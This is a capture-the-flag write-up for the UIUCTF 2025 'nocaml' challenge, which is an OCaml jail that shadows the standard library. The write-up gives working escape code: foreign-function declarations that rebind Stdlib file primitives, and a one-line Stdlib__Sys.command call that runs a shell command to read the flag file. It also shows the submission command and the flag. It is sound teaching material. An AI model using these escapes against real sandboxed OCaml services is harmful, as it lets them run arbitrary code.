---
title: UIUCTF 25 - nocaml
date: '2025-07-28T11:21:17+02:00'
math: false
categories:
- writeup
- uiuctf25
tags:
- misc
- ocaml
authors:
- nect
---

## Overview

This is a sort of jail written in OCaml.
The `nocaml.ml` module shadows all functions and modules of the standard library
and is automatically imported by the challenge (with `-open Nocaml`).

```ocaml
let raise = ()
let raise_notrace = ()
let invalid_arg = ()
let failwith = ()
let ( = ) = ()
let ( <> ) = ()
let ( < ) = ()
let ( > ) = ()
let ( <= ) = ()
let ( >= ) = ()
let compare = ()
let min = ()
let max = ()
let ( == ) = ()
let ( != ) = ()
let not = ()
let ( && ) = ()
let ( || ) = ()
let __LOC__ = ()
let __FILE__ = ()
let __LINE__ = ()
let __MODULE__ = ()
(* and so on ... *)
```

As usual, the objective is reading the file `flag.txt`.

## Exploitation

The first thing that came to mind was using `Pervasives` (the old name of the `Stdlib` module).
Unfortunately newer version of OCaml removed this alias.

At this point I went for the foreign function interface.
With the use of the `external` keyword, it's possible to declare
and invoke functions following the C ABI.

We don't have a way to create new foreign functions, but we don't really need to!
The `Stdlib` is always compiled and linked, even if we can't access it from the code.
This means that plenty of internal functions can be brought back with the FFI.

By diving into the [standard library code](https://github.com/ocaml/ocaml/tree/trunk/stdlib)
I found some useful primitives for IO.
The script we used to get the flag is the following:

```ocaml
(* directly from Stdlib *)
type open_flag =
    Open_rdonly | Open_wronly | Open_append
  | Open_creat | Open_trunc | Open_excl
  | Open_binary | Open_text | Open_nonblock

external open_desc : string -> open_flag list -> int -> int = "caml_sys_open";;
external set_in_channel_name : in_channel -> string -> unit = "caml_ml_set_channel_name";;
external open_descriptor_out : int -> out_channel = "caml_ml_open_descriptor_out"
external open_descriptor_in : int -> in_channel = "caml_ml_open_descriptor_in"
external output_char : out_channel -> char -> unit = "caml_ml_output_char";;
external input_char : in_channel -> char = "caml_ml_input_char";;

let open_in name =
  let c = open_descriptor_in (open_desc name [Open_rdonly; Open_text] 0) in
  set_in_channel_name c name;
  c
;;

let stdout = open_descriptor_out 1;;
let flag = open_in "flag.txt";;

let rec f () =
    output_char stdout (input_char flag);
    f ()
;;

f()
```

After this solve I also found a much shorter one (possibly unintended).
To prevent module collisions the compiler mangles module names (`Parent.Child` becomes `Parent__Child`).
The Stdlib is [not an exception][dune] to this, and `Nocaml` does not block those internal names.
So we can simply do:

```ocaml
Stdlib__Sys.command "cat flag.txt"
```

In both cases

```sh
$ (base64 -w0 solve.ml; echo) | ncat --no-shutdown --ssl nocaml.chal.uiuc.tf 1337
== proof-of-work: disabled ==
uiuctf{nocaml_79976241e31bee31e37c42885}
```

[dune]: https://github.com/ocaml/ocaml/blob/9d44d724ad63ea76e22f5ac4740d7d0a66ec92bd/toplevel/dune#L92
